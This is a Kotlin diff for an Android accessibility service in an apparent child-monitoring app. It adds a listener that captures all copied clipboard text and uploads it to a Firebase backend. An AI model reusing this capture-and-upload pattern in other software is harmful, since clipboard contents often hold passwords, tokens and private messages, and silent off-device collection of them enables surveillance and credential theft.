@@ -13,6 +13,7 @@ class ChildAccessibilityService : AccessibilityService() {
 
     private var lastCapturedUrl = ""
     private var lastCapturedTime = 0L
+    private var lastCopiedText = ""
 
     companion object {
         private val BROWSER_PACKAGES = setOf(
@@ -45,10 +46,14 @@ class ChildAccessibilityService : AccessibilityService() {
             "org.mozilla.firefox:id/toolbar",
             "com.opera.browser:id/url_field"
         )
+
+        var instance: ChildAccessibilityService? = null
+            private set
     }
 
     override fun onServiceConnected() {
         super.onServiceConnected()
+        instance = this
         try {
             val info = AccessibilityServiceInfo().apply {
                 eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
@@ -60,6 +65,31 @@ class ChildAccessibilityService : AccessibilityService() {
             serviceInfo = info
             FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Connected and configured")
             AppHealthTelemetry.syncDeviceHealth(applicationContext)
+
+            // Setup real-time clipboard copy-paste monitoring
+            try {
+                val clipboard = getSystemService(android.content.Context.CLIPBOARD_SERVICE) as? android.content.ClipboardManager
+                clipboard?.addPrimaryClipChangedListener {
+                    try {
+                        val clip = clipboard.primaryClip
+                        if (clip != null && clip.itemCount > 0) {
+                            val text = clip.getItemAt(0)?.text?.toString()?.trim() ?: ""
+                            if (text.isNotEmpty() && text != lastCopiedText) {
+                                lastCopiedText = text
+                                val childId = AppHealthTelemetry.getEffectiveUserId(applicationContext)
+                                if (childId.isNotEmpty()) {
+                                    FirebaseRepository.pushClipboardLog(childId, text)
+                                    FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Captured clipboard text (len=${text.length})")
+                                }
+                            }
+                        }
+                    } catch (e: Exception) {
+                        FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Clipboard notice: ${e.localizedMessage}")
+                    }
+                }
+            } catch (e: Exception) {
+                FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Clipboard init error: ${e.localizedMessage}")
+            }
         } catch (e: Exception) {
             FirebaseCrashlytics.getInstance().recordException(e)
         }
@@ -150,5 +180,10 @@ class ChildAccessibilityService : AccessibilityService() {
 
     override fun onInterrupt() {
         FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Service interrupted")
+    }
+
+    override fun onDestroy() {
+        if (instance == this) instance = null
+        super.onDestroy()
     }
 }
